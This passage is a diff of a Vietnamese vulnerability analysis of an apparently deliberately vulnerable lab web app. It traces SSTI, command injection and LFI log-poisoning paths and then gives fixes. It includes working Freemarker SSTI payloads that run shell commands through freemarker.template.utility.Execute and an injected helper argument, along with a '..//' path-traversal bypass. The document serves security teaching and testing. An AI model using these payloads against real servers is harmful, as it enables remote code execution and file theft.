@@ -2204,7 +2204,7 @@ Sau khi xác định sink là `QRCodeHelper.renderQrCode(qrContent)`, trace ngư
 | Call-site                      | Đường gọi vào sink                                                                                                | Source/path có nguy cơ                                                                              | Trạng thái hiện tại                                           |
 | ------------------------------ | ----------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------- | ------------------------------------------------------------- |
 | Default profile themes         | `light_mode.ftl` / `dark_mode.ftl` -> `memberQr(email)`                                                           | `User.email` từ DB, tạo qua signup hoặc update profile                                              | **Được bảo vệ** bằng strict email guard                       |
-| Custom/SSTI profile theme      | `CustomThemeLoader.renderTemplateSource(...)` parse attacker-selected template                                    | `theme` query param, persisted `profileTheme`, file/log content được load thành Freemarker template | **Còn nguy cơ**, là SSTI path                                 |
+| Custom/SSTI profile theme      | `CustomThemeLoader.renderTemplateSource(...)` parse attacker-selected template                                    | Persisted `profileTheme`, file/log content được load thành Freemarker template                      | **Còn nguy cơ**, là SSTI path                                 |
 | Booking quote                  | `/api/v1/booking/quote` -> `BookingServiceImpl.buildResponse(...)` -> `request.getQrCode()`                       | `BookingRequest.promotionCode` từ JSON/frontend                                                     | **Được bảo vệ** bằng `rejectUnsafeBusinessPromotionCode(...)` |
 | Booking hold                   | `/api/v1/booking/hold` -> `BookingOrder.qrCode(request.getQrCode())`                                              | `BookingRequest.promotionCode` từ JSON/frontend                                                     | **Được bảo vệ** bằng `rejectUnsafeBusinessPromotionCode(...)` |
 | Booking direct confirm         | `/api/v1/booking/confirm` không có `orderId` -> `buildResponse(...)` -> `request.getQrCode()`                     | `BookingRequest.promotionCode` từ JSON/frontend                                                     | **Được bảo vệ** bằng `rejectUnsafeBusinessPromotionCode(...)` |
@@ -2224,7 +2224,7 @@ flowchart RL
 
     T1["CustomThemeLoader.renderTemplateSource"]
     T2["Filesystem/classpath theme selected by themeName"]
-    T3["GET /profile/basic-info?theme=... or stored profileTheme"]
+    T3["GET /profile/basic-info uses stored profileTheme"]
     T4["Log/file content becomes Freemarker template"]
 
     B1["BookingRequest.getQrCode()"]
@@ -2295,11 +2295,11 @@ Vì vậy có thể kết luận:
 
 #### 2.3.3. Custom theme / SSTI path - source còn nguy cơ
 
-Route profile nhận `theme` query param, nếu không có thì lấy `user.profileTheme` :
+Route profile lấy theme từ `user.profileTheme` đã persisted:
 
 ```java
 // src/main/java/org/example/controller/ProfileViewController.java
-String themeName = resolveThemeName(user, theme);
+String themeName = resolveThemeName(user);
 return customThemeLoader.loadProfileTheme(themeName, buildProfileModel(user));
 ```
 
@@ -2342,7 +2342,6 @@ Kết luận path:
 
 | Source/path                     | Trạng thái                              | Vì sao vẫn nguy cơ                                            |
 | ------------------------------- | --------------------------------------- | ------------------------------------------------------------- |
-| `theme` query param             | Có thể điều khiển request-time          | Đi vào `CustomThemeLoader.loadProfileTheme(...)`              |
 | `user.profileTheme`             | Có thể persisted qua `PUT /api/v1/user` | Chưa ép allowlist, fix đang trong comment block               |
 | Filesystem/custom theme content | Có thể là file/log bị chọn              | `renderTemplateSource(...)` compile nội dung thành Freemarker |
 | Freemarker `?new()`             | Vẫn cho khởi tạo `QRCodeHelper`         | Template có thể tự truyền command payload vào helper          |
@@ -2467,7 +2466,7 @@ Kết luận path:
 | ------------------------------------------------------------ | --------------: | -----------------------------------------------: | ------------------------------------ |
 | Signup email -> default profile QR                           |              Có |                                            Không | Guard `SAFE_SIGNUP_EMAIL`            |
 | Update email -> default profile QR                           |              Có |                                            Không | Guard `SAFE_PROFILE_QR_EMAIL`        |
-| `theme` query / `profileTheme` -> custom Freemarker template |              Có |                                     Có, qua SSTI | SSTI path                            |
+| Stored `profileTheme` -> custom Freemarker template          |              Có |                                     Có, qua SSTI | SSTI path                            |
 | Booking quote/hold/direct confirm `promotionCode`            |              Có |                                            Không | Guard `SAFE_BUSINESS_PROMOTION_CODE` |
 | Confirm order fallback                                       |              Có |                                            Không | Không có string payload source       |
 | Draft import serialized bytes                                |              Có |                              Có, qua Deserialize | Deserialize path                     |
@@ -2539,8 +2538,8 @@ flowchart TD
     end
 
     subgraph ProfileSsti["Custom theme / SSTI - still risky"]
-        S1["theme query param"]
-        S2["stored user.profileTheme"]
+        S1["PUT /api/v1/user JSON profileTheme"]
+        S2["stored USER.PROFILE_THEME"]
         S3["CustomThemeLoader.loadProfileTheme(themeName, model)"]
         S4["Filesystem/classpath template content"]
         S5["Freemarker template calls QRCodeHelper with payload"]
@@ -2577,8 +2576,7 @@ flowchart TD
 
     P1 --> P3 --> P4 --> P5 --> P6 --> Q1
     P2 --> P3
-    S1 --> S3 --> S4 --> S5 --> Q1
-    S2 --> S3
+    S1 --> S2 --> S3 --> S4 --> S5 --> Q1
     B1 --> B2 --> B3 --> B4 --> B5 --> Q1
     C1 --> C2 --> C3 --> C4 --> Q1
     D1 --> D2 --> D3 --> D4 --> D5 --> Q1
@@ -2650,7 +2648,7 @@ Source chọn theme:
 
 ```java
 // src/main/java/org/example/controller/ProfileViewController.java
-String themeName = resolveThemeName(user, theme);
+String themeName = resolveThemeName(user);
 return customThemeLoader.loadProfileTheme(themeName, buildProfileModel(user));
 ```
 
@@ -2696,8 +2694,8 @@ sequenceDiagram
     participant QR as QRCodeHelper
     participant Shell as /bin/sh -c
 
-    Attacker->>Profile: theme query param
     Attacker->>UserAPI: Persist profileTheme
+    UserAPI-->>Attacker: profileTheme saved in USER row
     Profile->>Loader: loadProfileTheme(themeName, model)
     Loader->>File: Files.readString(resolvedThemePath)
     Loader->>FTL: new Template(...templateSource...)
@@ -2708,7 +2706,6 @@ sequenceDiagram
 
 | Step                         | Status | Security note                                                         |
 | ---------------------------- | ------ | --------------------------------------------------------------------- |
-| `theme` query param          | Rủi ro | Request-time theme selector đi vào loader                             |
 | `user.profileTheme`          | Rủi ro | Persisted selector chưa enforce allowlist                             |
 | Filesystem theme/log content | Rủi ro | Content được compile thành template                                   |
 | `QRCodeHelper?new()`         | Rủi ro | Template có thể truyền payload trực tiếp, không phụ thuộc email guard |
@@ -2887,7 +2884,6 @@ sequenceDiagram
 |---|---|---|---|
 | Signup email | `signup -> User.email -> memberQr(email) -> QRCodeHelper` | `SAFE_SIGNUP_EMAIL` | Chạm sink nhưng không còn command source |
 | Update email | `PUT /user -> User.email -> memberQr(email) -> QRCodeHelper` | `SAFE_PROFILE_QR_EMAIL` | Chạm sink nhưng không còn command source |
-| `theme` query | `theme -> CustomThemeLoader -> Freemarker -> QRCodeHelper` | Chưa allowlist chặt | Còn là SSTI path |
 | Stored `profileTheme` | `PUT /user -> profileTheme -> CustomThemeLoader -> Freemarker -> QRCodeHelper` | Fix đang comment | Còn là persisted SSTI selector |
 | Booking `promotionCode` | `FlightConfirm -> BookingRequest -> getQrCode() -> QRCodeHelper` | `SAFE_BUSINESS_PROMOTION_CODE` | Chạm sink nhưng không còn command source |
 | Confirm order fallback | `orderId -> orderRequest.getQrCode() -> QRCodeHelper` | Numeric/object-built data | Rủi ro command thấp |
@@ -2987,9 +2983,835 @@ Nếu response không trả command output và chỉ quan sát được delay/fi
 đánh dấu Blind Command Injection.
 ```
 
-
-
-# SSTI 
+# SSTI (Freemarker Object Chain + Dev-Supplied Helper)
 
 ***
 
+## 1. Kết luận nhanh cho SSTI
+
+| Thuộc tính | Giá trị |
+|---|---|
+| Entry point render | `GET /api/v1/profile/basic-info` |
+| Entry point ghi selector | `PUT /api/v1/user` với JSON field `profileTheme` |
+| Quyền truy cập | `ROLE_USER` hoặc `ROLE_ADMIN` |
+| Source selector chính | `User.profileTheme` persisted trong bảng `USER.PROFILE_THEME` |
+| Source template content | File trong `data/custom_themes`, hoặc file/log bị chọn qua LFI |
+| Sink template chính | `new Template("filesystem-profile-theme", new StringReader(templateSource), configuration)` rồi `template.process(model, writer)` |
+| Object-chain anchor | `profileTheme` trong Freemarker model là object `org.example.util.ProfileTheme` |
+| Dev-supplied helper | `"org.example.util.QRCodeHelper"?new()` được template gọi như method |
+| Config làm chain reachable | Freemarker `2.3.29`, `TemplateClassResolver.SAFER_RESOLVER`, `DefaultObjectWrapper` |
+| Trạng thái sau khi gỡ query | Không còn `theme` query param; flow chỉ đi qua persisted `profileTheme` từ JSON |
+
+> **Nhận định:** SSTI ở flow profile không còn nhận theme selector trực tiếp từ query string. Source điều khiển selector là `profileTheme` được ghi qua `PUT /api/v1/user`, sau đó `GET /api/v1/profile/basic-info` lấy giá trị đã lưu để chọn template. Khi file được chọn chứa Freemarker expression, backend compile nội dung đó bằng `new Template(...)`, từ đó mở hai hướng detect: object-chain qua `profileTheme` object và dev-supplied helper qua `QRCodeHelper?new()`.
+
+***
+
+## 2. Bản đồ flow tổng quan
+
+```mermaid
+flowchart TD
+    subgraph Source["Source"]
+        A1["PUT /api/v1/user"]
+        A2["JSON field: profileTheme"]
+        A3["USER.PROFILE_THEME"]
+    end
+
+    subgraph Render["Profile render"]
+        B1["GET /api/v1/profile/basic-info"]
+        B2["ProfileViewController.resolveThemeName(user)"]
+        B3["buildProfileModel(user)"]
+        B4["model.profileTheme = new ProfileTheme(...)"]
+    end
+
+    subgraph Loader["CustomThemeLoader"]
+        C1["loadProfileTheme(themeName, model)"]
+        C2["configuration.getTemplate('themes/' + themeName)"]
+        C3["Fallback: customThemeRoot.resolve(themeName)"]
+        C4["Files.readString(resolvedThemePath)"]
+        C5["new Template(...templateSource...)"]
+        C6["template.process(model, writer)"]
+    end
+
+    subgraph SSTI["SSTI primitives"]
+        D1["Object chain: profileTheme.class.protectionDomain.classLoader"]
+        D2["Dev-supplied helper: QRCodeHelper?new()"]
+    end
+
+    subgraph Impact["Impact"]
+        E1["Read/render template output"]
+        E2["Reach QRCodeHelper command sink"]
+        E3["Optional object-chain execution primitive"]
+    end
+
+    A1 --> A2 --> A3 --> B1
+    B1 --> B2 --> C1
+    B1 --> B3 --> B4 --> C6
+    C1 --> C2
+    C1 --> C3 --> C4 --> C5 --> C6
+    C6 --> D1 --> E3
+    C6 --> D2 --> E2
+    C6 --> E1
+```
+
+***
+
+## 3. Sink -> Source
+
+### 3.1. Fuzz dangerous function để tìm sink candidate
+
+Hướng sink -> source bắt đầu từ việc fuzz/tìm dangerous function của template engine, không bắt đầu từ endpoint. Với SSTI, các handle quan trọng là nơi **compile template từ string/file** và nơi **mở rộng quyền truy cập Java object**.
+
+| Nhóm dangerous function/config | Pattern fuzz trong code | Candidate tìm thấy | Kết luận |
+|---|---|---|---|
+| Runtime template compile | `new Template`, `StringReader`, `template.process` | `CustomThemeLoader.renderTemplateSource(...)` | Sink SSTI chính |
+| Template file load | `getTemplate`, `Files.readString`, `Path.resolve` | `loadClasspathTheme(...)`, `loadFilesystemTheme(...)` | Selector `themeName` quyết định template được render |
+| Freemarker class instantiation | `setNewBuiltinClassResolver`, `?new()` | `SAFER_RESOLVER`, default theme dùng `"org.example.util.QRCodeHelper"?new()` | Dev-supplied helper reachable |
+| Java object exposure | `DefaultObjectWrapper`, `model.put` object | `model.put("profileTheme", new ProfileTheme(...))` | Object-chain anchor reachable |
+| Source persistence | `setProfileTheme`, `@RequestBody User` | `UserController.editUser(...)` | `profileTheme` đến từ JSON update |
+| Render exposure | `produces = TEXT_HTML`, `dangerouslySetInnerHTML` | `ProfileViewController.basicInfo(...)`, `Profile.jsx` | Output HTML được frontend render lại |
+
+### 3.2. Sink template compile
+
+Sink chính nằm ở `CustomThemeLoader.renderTemplateSource(...)`:
+
+```java
+// src/main/java/org/example/util/CustomThemeLoader.java
+private String renderTemplateSource(String templateSource, Map<String, Object> model)
+        throws IOException, TemplateException {
+    Template template = new Template("filesystem-profile-theme", new StringReader(templateSource), configuration);
+    StringWriter writer = new StringWriter();
+    template.process(model, writer);
+    return writer.toString();
+}
+```
+
+Điểm nguy hiểm:
+
+| Dòng xử lý | Ý nghĩa bảo mật |
+|---|---|
+| `templateSource` là string đọc từ file | Nội dung ngoài source code có thể trở thành template |
+| `new Template(...StringReader...)` | Freemarker parse expression trong string |
+| `template.process(model, writer)` | Expression được evaluate với model do backend cung cấp |
+| Response là `TEXT_HTML` | Output được trả cho frontend và render bằng HTML |
+
+### 3.3. Dev-supplied helper: `QRCodeHelper?new()`
+
+Freemarker config đang dùng `SAFER_RESOLVER`:
+
+```java
+// src/main/java/org/example/config/FreeMarkerSandboxConfig.java
+configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
+```
+
+`SAFER_RESOLVER` vẫn cho template instantiate một số class hợp lệ trong application. WebLab có một helper nội bộ implement `TemplateMethodModelEx`:
+
+```java
+// src/main/java/org/example/util/QRCodeHelper.java
+public class QRCodeHelper implements TemplateMethodModelEx {
+    @Override
+    public Object exec(List arguments) throws TemplateModelException {
+        if (arguments.isEmpty()) {
+            return "";
+        }
+
+        return renderQrCode(toPlainString((TemplateModel) arguments.get(0)));
+    }
+}
+```
+
+Template mặc định đã chứng minh helper này được dev-supplied cho Freemarker:
+
+```ftl
+<#assign memberQr = "org.example.util.QRCodeHelper"?new()>
+<#assign memberQrUrl = memberQr(email)>
+```
+
+Khi template content bị attacker kiểm soát, helper có thể được gọi với argument do attacker chọn:
+
+```ftl
+<#assign qr = "org.example.util.QRCodeHelper"?new()>
+${qr("demo; touch /tmp/weblab-ssti-qr-marker; #")}
+```
+
+Luồng detect dev-supplied helper:
+
+```mermaid
+sequenceDiagram
+    actor Attacker
+    participant UserAPI as PUT /api/v1/user
+    participant Profile as GET /api/v1/profile/basic-info
+    participant Loader as CustomThemeLoader
+    participant FTL as Freemarker
+    participant QR as QRCodeHelper
+    participant Shell as /bin/sh -c
+
+    Attacker->>UserAPI: Persist profileTheme selector
+    Attacker->>Profile: Trigger profile render
+    Profile->>Loader: loadProfileTheme(stored profileTheme, model)
+    Loader->>FTL: new Template(...templateSource...)
+    FTL->>QR: "org.example.util.QRCodeHelper"?new()
+    FTL->>QR: qr(attacker-controlled argument)
+    QR->>Shell: qrencode command built from argument
+    Shell-->>QR: Marker / delay / OOB side effect
+```
+
+Kết luận riêng cho nhánh dev-supplied:
+
+| Điều kiện | Có trong code? | Ghi chú |
+|---|---:|---|
+| Template engine cho `?new()` | Có | `TemplateClassResolver.SAFER_RESOLVER` |
+| Helper application implement `TemplateMethodModelEx` | Có | `QRCodeHelper` |
+| Helper có side effect nguy hiểm | Có | Gọi `Runtime.exec(["/bin/sh","-c",command])` ở QR sink |
+| Template content controllable | Có khi chọn được file/custom/log content | Đây là điểm nối với LFI hoặc custom theme content |
+
+### 3.4. Object chain: `profileTheme` object anchor
+
+Profile model cố ý không expose nguyên `User`, nhưng vẫn expose một domain object nhỏ:
+
+```java
+// src/main/java/org/example/controller/ProfileViewController.java
+model.put("profileTheme", new ProfileTheme(resolveThemeName(user)));
+```
+
+`ProfileTheme` là Java object có getter:
+
+```java
+// src/main/java/org/example/util/ProfileTheme.java
+public class ProfileTheme {
+    private final String name;
+    private final String templatePath;
+    private final String displayName;
+    private final boolean darkMode;
+
+    public String getName() { return name; }
+    public String getTemplatePath() { return templatePath; }
+    public String getDisplayName() { return displayName; }
+    public boolean isDarkMode() { return darkMode; }
+}
+```
+
+Freemarker config dùng `DefaultObjectWrapper`:
+
+```java
+// src/main/java/org/example/config/FreeMarkerSandboxConfig.java
+configuration.setObjectWrapper(new DefaultObjectWrapper(Configuration.VERSION_2_3_29));
+```
+
+Vì vậy object-chain anchor có dạng:
+
+```ftl
+${profileTheme.name}
+${profileTheme.templatePath}
+${profileTheme.class.protectionDomain.classLoader}
+```
+
+Object-chain payload shape cụ thể:
+
+```ftl
+<#assign classLoader = profileTheme.class.protectionDomain.classLoader>
+<#assign objectWrapperClass = classLoader.loadClass("freemarker.template.ObjectWrapper")>
+<#assign defaultWrapper = objectWrapperClass.getField("DEFAULT_WRAPPER").get(null)>
+<#assign executeClass = classLoader.loadClass("freemarker.template.utility.Execute")>
+${defaultWrapper.newInstance(executeClass, null)("id")}
+```
+
+Luồng detect object-chain:
+
+```mermaid
+flowchart TD
+    A["Freemarker template content"]
+    B["model.profileTheme"]
+    C["ProfileTheme Java object"]
+    D["DefaultObjectWrapper bean-style access"]
+    E["profileTheme.class"]
+    F["protectionDomain.classLoader"]
+    G["loadClass('freemarker.template.utility.Execute')"]
+    H["defaultWrapper.newInstance(...)"]
+    I["Execute('id') or time-based command"]
+
+    A --> B --> C --> D --> E --> F --> G --> H --> I
+```
+
+Kết luận riêng cho nhánh object-chain:
+
+| Điều kiện | Có trong code? | Ghi chú |
+|---|---:|---|
+| Model expose object không phải scalar | Có | `ProfileTheme` |
+| Wrapper cho phép bean-style object access | Có | `DefaultObjectWrapper` |
+| Version cố định phù hợp lab | Có | `freemarker.version = 2.3.29` |
+| Template content được evaluate | Có | `new Template(...).process(...)` |
+
+### 3.5. Truy ngược về source `profileTheme`
+
+Sau khi xác định sink là `new Template(...).process(...)`, trace ngược `themeName`:
+
+```java
+// src/main/java/org/example/controller/ProfileViewController.java
+public String basicInfo(Authentication authentication) {
+    User user = resolveAuthenticatedUser(authentication);
+
+    String themeName = resolveThemeName(user);
+    return customThemeLoader.loadProfileTheme(themeName, buildProfileModel(user));
+}
+```
+
+`resolveThemeName(user)` chỉ lấy persisted value:
+
+```java
+private String resolveThemeName(User user) {
+    if (user == null || !StringUtils.hasText(user.getProfileTheme())) {
+        return DEFAULT_THEME;
+    }
+    return user.getProfileTheme().trim();
+}
+```
+
+Source ghi persisted value:
+
+```java
+// src/main/java/org/example/controller/UserController.java
+@PutMapping
+public ResponseEntity<?> editUser(@RequestBody User user, Authentication authentication) {
+    if (user.getProfileTheme() == null) {
+        user.setProfileTheme(existingUser.getProfileTheme());
+    }
+    userService.save(user);
+}
+```
+
+Trace sink -> source:
+
+```mermaid
+flowchart RL
+    S1["new Template(...templateSource...)"]
+    S2["template.process(model, writer)"]
+    S3["templateSource = Files.readString(resolvedThemePath)"]
+    S4["resolvedThemePath = customThemeRoot.resolve(themeName)"]
+    S5["themeName = resolveThemeName(user)"]
+    S6["user.profileTheme"]
+    S7["PUT /api/v1/user JSON profileTheme"]
+
+    S1 --> S2
+    S1 --> S3 --> S4 --> S5 --> S6 --> S7
+```
+
+***
+
+## 4. Source -> Sink
+
+### 4.1. Stored `profileTheme` source -> Freemarker sink
+
+```mermaid
+sequenceDiagram
+    actor Attacker
+    participant UserAPI as PUT /api/v1/user
+    participant DB as USER.PROFILE_THEME
+    participant Profile as GET /api/v1/profile/basic-info
+    participant Loader as CustomThemeLoader
+    participant FS as Filesystem
+    participant FTL as Freemarker runtime
+    participant Browser as React Profile.jsx
+
+    Attacker->>UserAPI: JSON body includes profileTheme
+    UserAPI->>DB: userService.save(user)
+    Attacker->>Profile: Render profile card
+    Profile->>DB: Load authenticated user
+    Profile->>Loader: loadProfileTheme(user.profileTheme, model)
+    Loader->>FS: Files.readString(resolvedThemePath)
+    Loader->>FTL: new Template(...).process(model)
+    FTL-->>Profile: Rendered HTML
+    Profile-->>Browser: text/html response
+    Browser->>Browser: dangerouslySetInnerHTML
+```
+
+Security notes:
+
+| Step | Rủi ro | Ghi chú |
+|---|---|---|
+| `PUT /api/v1/user` | Có | Backend nhận nguyên `User` JSON, chỉ giữ lại existing theme khi field null |
+| `USER.PROFILE_THEME` | Có | Stored selector khiến chain persistent |
+| `resolveThemeName(user)` | Có | Không allowlist `light_mode.ftl`, `dark_mode.ftl` |
+| `customThemeRoot.resolve(themeName)` | Có | Không normalize + `startsWith(customThemeRoot)` |
+| `new Template(...templateSource...)` | Có | File content trở thành executable Freemarker template |
+
+### 4.2. Source template content -> dev-supplied helper sink
+
+Nếu file được chọn có nội dung Freemarker, expression được evaluate. Với helper dev-supplied:
+
+```ftl
+<#assign qr = "org.example.util.QRCodeHelper"?new()>
+${qr("demo; sleep 5; #")}
+```
+
+Luồng đến hidden command sink:
+
+```mermaid
+flowchart TD
+    A["Template content contains QRCodeHelper?new()"]
+    B["SAFER_RESOLVER allows application TemplateModel class"]
+    C["QRCodeHelper.exec(arguments)"]
+    D["renderQrCode(qrContent)"]
+    E["command = 'qrencode ... ' + resolvedContent"]
+    F["Runtime.exec(['/bin/sh','-c',command])"]
+    G["Blind signal: delay/file/OOB"]
+
+    A --> B --> C --> D --> E --> F --> G
+```
+
+Detect signal:
+
+| Payload intent | Signal kỳ vọng |
+|---|---|
+| `${7 * 7}` trong template content | Response HTML có output `49` |
+| `QRCodeHelper?new()` với `sleep 5` | Response render chậm |
+| `QRCodeHelper?new()` với marker file | File marker xuất hiện trên host/container |
+| `QRCodeHelper?new()` với OOB | Có DNS/HTTP callback |
+
+### 4.3. Source template content -> object-chain sink
+
+Với object-chain, payload không cần `QRCodeHelper`. Nó dùng object `profileTheme` có sẵn trong model:
+
+```ftl
+<#assign cl = profileTheme.class.protectionDomain.classLoader>
+<#assign owc = cl.loadClass("freemarker.template.ObjectWrapper")>
+<#assign dw = owc.getField("DEFAULT_WRAPPER").get(null)>
+<#assign ec = cl.loadClass("freemarker.template.utility.Execute")>
+${dw.newInstance(ec, null)("id")}
+```
+
+Luồng từ source đến object-chain:
+
+```mermaid
+sequenceDiagram
+    actor Attacker
+    participant Template as Controlled template content
+    participant FTL as Freemarker runtime
+    participant Model as Profile model
+    participant ThemeObj as ProfileTheme object
+    participant CL as ClassLoader
+    participant Exec as freemarker.template.utility.Execute
+
+    Template->>FTL: profileTheme.class...
+    FTL->>Model: Resolve profileTheme
+    Model-->>FTL: ProfileTheme object
+    FTL->>ThemeObj: class.protectionDomain.classLoader
+    ThemeObj-->>CL: Application ClassLoader
+    FTL->>CL: loadClass("freemarker.template.utility.Execute")
+    CL-->>Exec: Execute class
+    FTL->>Exec: newInstance(...)(command)
+```
+
+Detect signal:
+
+| Probe | Ý nghĩa |
+|---|---|
+| `${profileTheme.name}` | Chứng minh object được expose vào template |
+| `${profileTheme.class}` | Chứng minh object wrapper cho class metadata |
+| `${profileTheme.class.protectionDomain.classLoader}` | Chứng minh object-chain anchor đến classloader |
+| `Execute("id")` hoặc `Execute("sleep 5")` | Chứng minh object-chain có thể tạo command side effect |
+
+***
+
+## 5. Fix guidance đặt cạnh sink
+
+### 5.1. Fix selector `profileTheme`
+
+Không persist arbitrary filename/path từ JSON. Chỉ nhận theme id trong allowlist:
+
+```java
+private static final Set<String> ALLOWED_PROFILE_THEMES =
+        Set.of("light_mode.ftl", "dark_mode.ftl");
+
+String requestedTheme = user.getProfileTheme();
+if (!StringUtils.hasText(requestedTheme)) {
+    user.setProfileTheme(existingUser.getProfileTheme());
+} else if (!ALLOWED_PROFILE_THEMES.contains(requestedTheme)) {
+    return ResponseEntity.badRequest().body("Invalid profile theme");
+}
+```
+
+### 5.2. Fix template loading
+
+Không compile arbitrary filesystem content làm Freemarker template:
+
+```java
+private static final Map<String, String> THEME_ALLOWLIST = Map.of(
+        "light_mode.ftl", "themes/light_mode.ftl",
+        "dark_mode.ftl", "themes/dark_mode.ftl");
+
+String templatePath = THEME_ALLOWLIST.getOrDefault(themeName, "themes/light_mode.ftl");
+Template template = configuration.getTemplate(templatePath);
+```
+
+Nếu vẫn cần custom theme, phải normalize path và chặn thoát root:
+
+```java
+Path root = customThemeRoot.toRealPath();
+Path candidate = root.resolve(themeName).normalize();
+if (!candidate.startsWith(root) || !candidate.getFileName().toString().endsWith(".ftl")) {
+    throw new IllegalArgumentException("Invalid theme path");
+}
+```
+
+### 5.3. Fix Freemarker sandbox
+
+Không cho template tự instantiate arbitrary class:
+
+```java
+configuration.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
+configuration.setObjectWrapper(new SimpleObjectWrapper(Configuration.VERSION_2_3_29));
+```
+
+Nếu cần helper, expose instance đã audit:
+
+```java
+configuration.setSharedVariable("qrHelper", new SafeQRCodeHelper());
+```
+
+### 5.4. Fix object-chain anchor
+
+Không expose Java object vào model khi chỉ cần text:
+
+```java
+model.put("profileTheme", resolveThemeName(user));
+model.put("profileThemeName", new ProfileTheme(resolveThemeName(user)).getName());
+```
+
+***
+
+## 6. Tổng kết SSTI
+
+SSTI detect được trình bày riêng theo hai hướng:
+
+1. **Dev-supplied helper:** `SAFER_RESOLVER` + `QRCodeHelper implements TemplateMethodModelEx` cho phép template gọi `"org.example.util.QRCodeHelper"?new()`, rồi đưa argument vào hidden command sink.
+2. **Object chain:** `DefaultObjectWrapper` + `model.profileTheme = new ProfileTheme(...)` cho phép template đi từ `profileTheme.class` đến `classLoader`, rồi load các utility class như `freemarker.template.utility.Execute`.
+
+Sau khi gỡ `theme` query, source selector hợp lệ duy nhất của flow này là:
+
+```text
+PUT /api/v1/user JSON profileTheme
+-> USER.PROFILE_THEME
+-> GET /api/v1/profile/basic-info
+-> CustomThemeLoader
+-> Freemarker sink
+```
+
+***
+
+# LFI Log Poisoning
+
+***
+
+## 1. Kết luận nhanh cho LFI Log Poisoning
+
+| Thuộc tính | Giá trị |
+|---|---|
+| Entry point poison log | Bất kỳ request HTTP được Tomcat access log ghi lại |
+| Entry point chọn file | `PUT /api/v1/user` với JSON field `profileTheme` |
+| Entry point trigger read | `GET /api/v1/profile/basic-info` |
+| Source log content | Request line, Referer, User-Agent trong Tomcat `combined` access log |
+| Source file selector | Persisted `User.profileTheme` |
+| LFI sink | `Files.readString(resolvedThemePath, StandardCharsets.UTF_8)` |
+| Log file mặc định | `logs/access.log` |
+| Bypass chính | Regex chỉ bắt `../`, nhưng bỏ sót `..//` |
+| Kết hợp với SSTI | Log content sau khi đọc tiếp tục bị `new Template(...).process(...)` evaluate |
+
+> **Nhận định:** LFI Log Poisoning cần tách thành hai detect riêng. Detect LFI trước bằng cách ghi marker vào access log rồi ép `profileTheme` trỏ tới `..//..//logs/access.log`. Nếu marker xuất hiện trong response profile HTML, đã chứng minh đọc file log thành công. Sau đó mới nâng cấp chain bằng Freemarker payload trong log để biến LFI thành SSTI.
+
+***
+
+## 2. Bản đồ flow tổng quan
+
+```mermaid
+flowchart TD
+    subgraph Poison["Log poisoning"]
+        A1["HTTP request with marker/payload"]
+        A2["Tomcat access log pattern: combined"]
+        A3["logs/access.log"]
+    end
+
+    subgraph Selector["Persisted file selector"]
+        B1["PUT /api/v1/user"]
+        B2["profileTheme = '..//..//logs/access.log'"]
+        B3["USER.PROFILE_THEME"]
+    end
+
+    subgraph LFI["LFI read"]
+        C1["GET /api/v1/profile/basic-info"]
+        C2["CustomThemeLoader.loadFilesystemTheme"]
+        C3["customThemeRoot.resolve(themeName)"]
+        C4["Files.readString(resolvedThemePath)"]
+    end
+
+    subgraph Render["Optional SSTI upgrade"]
+        D1["new Template(...log content...)"]
+        D2["template.process(model, writer)"]
+        D3["Marker output or Freemarker execution"]
+    end
+
+    A1 --> A2 --> A3
+    B1 --> B2 --> B3 --> C1
+    C1 --> C2 --> C3 --> C4
+    A3 --> C4 --> D1 --> D2 --> D3
+```
+
+***
+
+## 3. Sink -> Source
+
+### 3.1. Fuzz dangerous function để tìm sink candidate
+
+Hướng sink -> source của LFI bắt đầu từ các dangerous function đọc file và xử lý path:
+
+| Nhóm dangerous function/config | Pattern fuzz trong code | Candidate tìm thấy | Kết luận |
+|---|---|---|---|
+| File read | `Files.readString`, `Files.readAllBytes` | `CustomThemeLoader.loadFilesystemTheme(...)` | LFI sink |
+| Path join | `Path.resolve`, `Paths.get` | `customThemeRoot.resolve(themeName)` | Path phụ thuộc `themeName` |
+| Path filter yếu | `Pattern.compile`, `../` | `OBVIOUS_PARENT_TRAVERSAL` | Miss `..//` bypass |
+| Log source | `server.tomcat.accesslog.*` | `application.properties` bật access log `combined` | Có file log chứa user-controlled data |
+| Source persistence | `setProfileTheme`, `@RequestBody User` | `UserController.editUser(...)` | Selector file đến từ JSON |
+
+### 3.2. LFI sink trong `CustomThemeLoader`
+
+```java
+// src/main/java/org/example/util/CustomThemeLoader.java
+Path resolvedThemePath = customThemeRoot.resolve(themeName);
+String templateSource = Files.readString(resolvedThemePath, StandardCharsets.UTF_8);
+return renderTemplateSource(templateSource, model);
+```
+
+Filter path hiện tại:
+
+```java
+private static final Pattern OBVIOUS_PARENT_TRAVERSAL = Pattern.compile("(^|/)\\.\\./(?!/)");
+```
+
+Vì regex này chỉ bắt parent traversal có một slash sau `..`, payload dạng `..//` không bị match, trong khi filesystem vẫn hiểu repeated slash là separator hợp lệ.
+
+Trace sink -> source:
+
+```mermaid
+flowchart RL
+    S1["Files.readString(resolvedThemePath)"]
+    S2["resolvedThemePath = customThemeRoot.resolve(themeName)"]
+    S3["themeName passes weak OBVIOUS_PARENT_TRAVERSAL"]
+    S4["themeName = user.profileTheme"]
+    S5["PUT /api/v1/user JSON profileTheme"]
+    L1["logs/access.log"]
+    L2["Tomcat accesslog combined"]
+    L3["HTTP User-Agent / Referer / request line"]
+
+    S1 --> S2 --> S3 --> S4 --> S5
+    S1 --> L1 --> L2 --> L3
+```
+
+### 3.3. Truy ngược về log source
+
+Access log được bật trong config:
+
+```properties
+server.tomcat.basedir=${SERVER_TOMCAT_BASEDIR:.}
+server.tomcat.accesslog.enabled=${SERVER_TOMCAT_ACCESSLOG_ENABLED:true}
+server.tomcat.accesslog.directory=${SERVER_TOMCAT_ACCESSLOG_DIRECTORY:logs}
+server.tomcat.accesslog.prefix=${SERVER_TOMCAT_ACCESSLOG_PREFIX:access}
+server.tomcat.accesslog.suffix=${SERVER_TOMCAT_ACCESSLOG_SUFFIX:.log}
+server.tomcat.accesslog.file-date-format=${SERVER_TOMCAT_ACCESSLOG_FILE_DATE_FORMAT:}
+server.tomcat.accesslog.pattern=${SERVER_TOMCAT_ACCESSLOG_PATTERN:combined}
+```
+
+`combined` access log ghi các vùng attacker thường kiểm soát được như request line, Referer, User-Agent. Ví dụ log thực tế trong repo đã có User-Agent chứa Freemarker expression:
+
+```text
